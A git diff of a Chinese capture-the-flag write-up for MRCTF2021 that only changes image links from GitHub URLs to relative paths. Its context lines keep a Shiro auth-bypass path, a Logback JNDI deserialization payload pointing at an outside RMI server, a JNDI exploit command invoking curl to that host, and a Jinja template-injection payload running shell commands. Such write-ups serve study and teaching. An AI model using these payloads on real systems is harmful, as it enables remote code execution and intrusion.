@@ -136,11 +136,11 @@ namespace {
 
 看到 /login 界面, 尝试 post 东西上去, 发现 deleteMe 得知是 shrio
 
-![20210410181413035](https://github.com/Ricky-369369/Rickyweb/blob/main/Nepnep/Probation/img/20210410181413035.png?raw=true)
+![20210410181413035](img/20210410181413035.png?raw=true)
 
 /;/json 绕过鉴权访问 /json接⼝
 
-![20210410182209298](https://github.com/Ricky-369369/Rickyweb/blob/main/Nepnep/Probation/img/20210410182209298.png?raw=true)
+![20210410182209298](img/20210410182209298.png?raw=true)
 
 jackson反序列化，post Logback 反序列化链进行 JNDI 注入 
 
@@ -160,15 +160,15 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl http://39.97.114.
 ["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"rmi://39.97.114.43:1099/rsguep"}] 
 ```
 
-![20210410212709257](https://github.com/Ricky-369369/Rickyweb/blob/main/Nepnep/Probation/img/20210410212709257.png?raw=true)
+![20210410212709257](img/20210410212709257.png?raw=true)
 
 然后这边服务会收到响应传出命令
 
-![20210410212208728](https://github.com/Ricky-369369/Rickyweb/blob/main/Nepnep/Probation/img/20210410212208728.png?raw=true)
+![20210410212208728](img/20210410212208728.png?raw=true)
 
 返回以后查看监听端口, 就可以得到 flag
 
-![20210410212256633](https://github.com/Ricky-369369/Rickyweb/blob/main/Nepnep/Probation/img/20210410212256633.png?raw=true)
+![20210410212256633](img/20210410212256633.png?raw=true)
 
 ## [MRCTF2021] wwwafed_app
 
@@ -226,7 +226,7 @@ node.mrctf.funaaaaaaaaaaaaaaaaa{{lipsum.__globals__["os"].popen("ls").read()}}
 
 然后可以看到目录
 
-![20210412010615259](https://github.com/Ricky-369369/Rickyweb/blob/main/Nepnep/Probation/img/20210412010615259.png?raw=true)
+![20210412010615259](img/20210412010615259.png?raw=true)
 
 一般 flag 藏在根目录, 提供两种方法
 
